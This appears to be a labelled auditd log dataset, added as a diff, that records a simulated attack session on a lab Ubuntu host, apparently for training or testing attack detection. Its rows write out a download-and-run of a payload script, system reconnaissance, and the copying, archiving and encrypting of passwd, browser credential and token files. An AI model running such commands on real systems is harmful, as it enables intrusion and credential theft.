@@ -1,0 +1,28 @@
+_id,@timestamp,host.name,host,command_executed,a0,argc,is_attack,session_id
+auditd_attack_01_0001,2026-09-10T14:32:10Z,cyber-lab-ubuntu,cyber-lab-ubuntu,"python3 -c import urllib.request; urllib.request.urlretrieve(""http://127.0.0.1:8088/payload.sh"",""/tmp/lab_payload.sh"")",python3,3,1,attack_session_01
+auditd_attack_01_0002,2026-09-10T14:32:10Z,cyber-lab-ubuntu,cyber-lab-ubuntu,chmod +x /tmp/lab_payload.sh,chmod,3,1,attack_session_01
+auditd_attack_01_0003,2026-09-10T14:32:10Z,cyber-lab-ubuntu,cyber-lab-ubuntu,/bin/bash /tmp/lab_payload.sh,/bin/bash,2,1,attack_session_01
+auditd_attack_01_0004,2026-09-10T14:32:10Z,cyber-lab-ubuntu,cyber-lab-ubuntu,whoami,whoami,1,1,attack_session_01
+auditd_attack_01_0005,2026-09-10T14:32:10Z,cyber-lab-ubuntu,cyber-lab-ubuntu,id,id,1,1,attack_session_01
+auditd_attack_01_0006,2026-09-10T14:32:10Z,cyber-lab-ubuntu,cyber-lab-ubuntu,uname -a,uname,2,1,attack_session_01
+auditd_attack_01_0007,2026-09-10T14:32:10Z,cyber-lab-ubuntu,cyber-lab-ubuntu,whoami,whoami,1,1,attack_session_01
+auditd_attack_01_0008,2026-09-10T14:32:10Z,cyber-lab-ubuntu,cyber-lab-ubuntu,id,id,1,1,attack_session_01
+auditd_attack_01_0009,2026-09-10T14:32:10Z,cyber-lab-ubuntu,cyber-lab-ubuntu,hostname,hostname,1,1,attack_session_01
+auditd_attack_01_0010,2026-09-10T14:32:10Z,cyber-lab-ubuntu,cyber-lab-ubuntu,uname -a,uname,2,1,attack_session_01
+auditd_attack_01_0011,2026-09-10T14:32:10Z,cyber-lab-ubuntu,cyber-lab-ubuntu,ip addr,ip,2,1,attack_session_01
+auditd_attack_01_0012,2026-09-10T14:32:10Z,cyber-lab-ubuntu,cyber-lab-ubuntu,ip route,ip,2,1,attack_session_01
+auditd_attack_01_0013,2026-09-10T14:32:10Z,cyber-lab-ubuntu,cyber-lab-ubuntu,ss -tuln,ss,2,1,attack_session_01
+auditd_attack_01_0014,2026-09-10T14:32:10Z,cyber-lab-ubuntu,cyber-lab-ubuntu,ps aux,ps,2,1,attack_session_01
+auditd_attack_01_0015,2026-09-10T14:32:10Z,cyber-lab-ubuntu,cyber-lab-ubuntu,cat /etc/passwd,cat,2,1,attack_session_01
+auditd_attack_01_0016,2026-09-10T14:32:10Z,cyber-lab-ubuntu,cyber-lab-ubuntu,cp /etc/passwd loot/passwd_copy,cp,3,1,attack_session_01
+auditd_attack_01_0017,2026-09-10T14:32:10Z,cyber-lab-ubuntu,cyber-lab-ubuntu,cat target/browser_creds.txt,cat,2,1,attack_session_01
+auditd_attack_01_0018,2026-09-10T14:32:10Z,cyber-lab-ubuntu,cyber-lab-ubuntu,cat target/token.txt,cat,2,1,attack_session_01
+auditd_attack_01_0019,2026-09-10T14:32:10Z,cyber-lab-ubuntu,cyber-lab-ubuntu,cp target/browser_creds.txt loot/,cp,3,1,attack_session_01
+auditd_attack_01_0020,2026-09-10T14:32:10Z,cyber-lab-ubuntu,cyber-lab-ubuntu,cp target/token.txt loot/,cp,3,1,attack_session_01
+auditd_attack_01_0021,2026-09-10T14:32:10Z,cyber-lab-ubuntu,cyber-lab-ubuntu,tar -czf /tmp/lab_collection.tar.gz target loot,tar,5,1,attack_session_01
+auditd_attack_01_0022,2026-09-10T14:32:10Z,cyber-lab-ubuntu,cyber-lab-ubuntu,/bin/sh -c gzip,/bin/sh,3,1,attack_session_01
+auditd_attack_01_0023,2026-09-10T14:32:10Z,cyber-lab-ubuntu,cyber-lab-ubuntu,gzip,gzip,1,1,attack_session_01
+auditd_attack_01_0024,2026-09-10T14:32:10Z,cyber-lab-ubuntu,cyber-lab-ubuntu,xxd -p /tmp/lab_collection.tar.gz,xxd,3,1,attack_session_01
+auditd_attack_01_0025,2026-09-10T14:32:10Z,cyber-lab-ubuntu,cyber-lab-ubuntu,openssl enc -aes-256-cbc -salt -pbkdf2 -pass pass:LAB_ONLY_PASSWORD -in target/report.txt -out /tmp/lab_report.enc,openssl,11,1,attack_session_01
+auditd_attack_01_0026,2026-09-10T14:32:10Z,cyber-lab-ubuntu,cyber-lab-ubuntu,ls --color=auto -lh /tmp/lab_collection.tar.gz /tmp/lab_report.enc,ls,5,1,attack_session_01
+auditd_attack_01_0027,2026-09-10T14:32:10Z,cyber-lab-ubuntu,cyber-lab-ubuntu,cat target/fake_crontab.txt,cat,2,1,attack_session_01
